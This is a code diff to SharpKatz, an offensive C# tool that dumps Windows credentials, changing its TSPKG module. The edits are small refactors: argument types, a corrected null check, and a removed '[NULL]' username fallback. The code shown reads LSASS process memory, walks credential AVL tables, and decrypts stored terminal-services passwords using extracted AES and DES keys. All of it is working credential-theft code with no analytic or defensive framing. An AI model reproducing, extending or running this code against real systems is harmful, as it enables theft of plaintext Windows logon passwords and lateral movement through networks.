@@ -91,7 +91,7 @@ namespace SharpKatz.Module
 
             if (tsGlobalCredTableAddr != IntPtr.Zero)
             {
-                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
+                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, tsGlobalCredTableAddr, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
                 entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
                 llCurrent = entry.BalancedRoot.RightChild;
@@ -108,21 +108,20 @@ namespace SharpKatz.Module
 
         private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
-            
-            if (pElement == null)
+            if (pElement == IntPtr.Zero)
                 return;
 
-            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
+            byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Marshal.SizeOf(typeof(RTL_AVL_TABLE)));
             RTL_AVL_TABLE entry = Utility.ReadStruct<RTL_AVL_TABLE>(entryBytes);
 
             if (entry.OrderedPointer != IntPtr.Zero)
             {
-                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Convert.ToUInt64(Marshal.SizeOf(oshelper.TSCredType)));
+                byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Marshal.SizeOf(oshelper.TSCredType));
 
                 LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBytes, oshelper.TSCredLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
                 long pCredAddr = BitConverter.ToInt64(krbrLogonSessionBytes, oshelper.TSCredOffset);
 
-                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL))));
+                byte[] pCredBytes = Utility.ReadFromLsass(ref hLsass, new IntPtr(pCredAddr), Marshal.SizeOf(typeof(KIWI_TS_PRIMARY_CREDENTIAL)));
                 KIWI_TS_PRIMARY_CREDENTIAL pCred = Utility.ReadStruct<KIWI_TS_PRIMARY_CREDENTIAL>(pCredBytes);
 
                 UNICODE_STRING usUserName = pCred.credentials.UserName;
@@ -132,7 +131,7 @@ namespace SharpKatz.Module
                 string username = Utility.ExtractUnicodeStringString(hLsass, usUserName);
                 string domain = Utility.ExtractUnicodeStringString(hLsass, usDomain);
                 
-                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, (ulong)usPassword.MaximumLength);
+                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, usPassword.Buffer, usPassword.MaximumLength);
 
                 byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);
 
@@ -151,15 +150,7 @@ namespace SharpKatz.Module
                 {
 
                     Credential.Tspkg krbrentry = new Credential.Tspkg();
-
-                    if (!string.IsNullOrEmpty(username))
-                    {
-                        krbrentry.UserName = username;
-                    }
-                    else
-                    {
-                        krbrentry.UserName = "[NULL]";
-                    }
+                    krbrentry.UserName = username;
 
                     if (!string.IsNullOrEmpty(domain))
                     {
